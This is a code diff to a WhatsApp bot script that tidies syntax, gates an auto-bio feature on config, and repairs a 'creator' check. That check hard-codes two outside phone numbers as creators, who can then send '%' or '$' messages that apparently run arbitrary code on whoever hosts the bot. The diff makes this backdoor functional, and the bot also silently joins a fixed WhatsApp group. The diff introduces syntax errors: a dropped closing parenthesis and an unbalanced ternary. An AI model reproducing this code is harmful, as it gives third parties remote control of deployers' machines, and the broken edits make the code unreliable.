@@ -1,4 +1,3 @@
-
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -58,7 +57,7 @@ const clearTempDir = () => {
     for (const file of files) {
       fs.unlink(path.join(tempDir, file), err => {
         if (err) throw err
-      })
+      }
     }
   })
 }
@@ -133,9 +132,9 @@ async function connectToWA() {
                  
           // Join group if needed
           try {
-            await conn.groupAcceptInvite('Ldj77CF30TV2Ca7fULWn1n');
+            await conn.groupAcceptInvite('Ldj77CF30TV2Ca7fULWn1n')
           } catch (groupErr) {
-            console.error('Error joining group:', groupErr);
+            console.error('Error joining group:', groupErr)
           }
           const startMess = {
             image: { url: 'https://files.catbox.moe/y3j3kl.jpg' },
@@ -189,19 +188,21 @@ async function connectToWA() {
     conn.ev.on('messages.upsert', async(mek) => {
       mek = mek.messages[0]
       if (!mek.message) return
-      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+      mek.message = (getContentType(mek.message) === 'ephemeralMessage' 
         ? mek.message.ephemeralMessage.message 
         : mek.message
       
       if (config.READ_MESSAGE === 'true') {
         await conn.readMessages([mek.key])  // Mark message as read
         console.log(`Marked message from ${mek.key.remoteJid} as read.`)
-      //🔵auto bio
-
-if (autobio) {
-  conn.updateProfileStatus(`${botname} is Live! 🤔\n\n           🕒 🚀𝙐𝙥𝙩𝙞𝙢𝙚: 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 𝘍𝘰𝘳 ${runtime(process.uptime())}`)
-    .catch(err => console.error("Error updating status:", err));
       }
+      
+      //🔵auto bio
+      if (config.AUTO_BIO === 'true') {
+        conn.updateProfileStatus(`${config.BOT_NAME} is Live! 🤔\n\n           🕒 🚀𝙐𝙥𝙩𝙞𝙢𝙚: 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 𝘍𝘰𝘳 ${runtime(process.uptime())}`)
+          .catch(err => console.error("Error updating status:", err))
+      }
+      
       if(mek.message.viewOnceMessageV2) {
         mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
       }
@@ -264,12 +265,12 @@ if (autobio) {
       }
       
       const udp = botNumber.split('@')[0]
-      const rav = ('254112192119', '254101022551')
-      let isCreator = [udp, rav, config.DEV]
-        .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-        .includes(mek.sender)
+      const rav = ['254112192119', '254101022551']
+      let isCreator = [udp, ...rav, config.DEV]
+        .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+        .includes(m.sender)
 
-      if (isCreator && mek.text.startsWith('%')) {
+      if (isCreator && mek.text && mek.text.startsWith('%')) {
         let code = budy.slice(2)
         if (!code) {
           reply(`Provide me with a query to run Master!`)
@@ -286,7 +287,7 @@ if (autobio) {
         return
       }
       
-      if (isCreator && mek.text.startsWith('$')) {
+      if (isCreator && mek.text && mek.text.startsWith('$')) {
         let code = budy.slice(2)
         if (!code) {
           reply(`Provide me with a query to run Master!`)
@@ -309,7 +310,7 @@ if (autobio) {
       
       //================ownerreact==============
       if (senderNumber.includes("254112192119") && !isReact) {
-        const reactions = ["👑", "🥳", "📊", "⚙️", "🧠", "🎯", "✨", "🔑", "🏆", "👻", "🎉", "💗", "❤️", "😜", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌟", "🐥", "🧊"]
+        const reactions = ["👑", "🥳", "📊", "⚙️", "🧠", "🎯", "✨", "🔑", "🏆", "👻", "🎉", "💗", "❤️", "😜", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌟", "🐥", "🧊"]
         const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
         m.react(randomReaction)
       }
@@ -770,12 +771,12 @@ app.get("/", (req, res) => {
 
 // Anti-crash handler
 process.on("uncaughtException", (err) => {
-  console.error("[❗] Uncaught Exception:", err.stack || err);
-});
+  console.error("[❗] Uncaught Exception:", err.stack || err)
+})
 
 process.on("unhandledRejection", (reason, p) => {
-  console.error("[❗] Unhandled Promise Rejection:", reason);
-});
+  console.error("[❗] Unhandled Promise Rejection:", reason)
+})
 
 app.listen(port, '0.0.0.0', () => console.log(`Server listening on port http://0.0.0.0:${port}`))
 
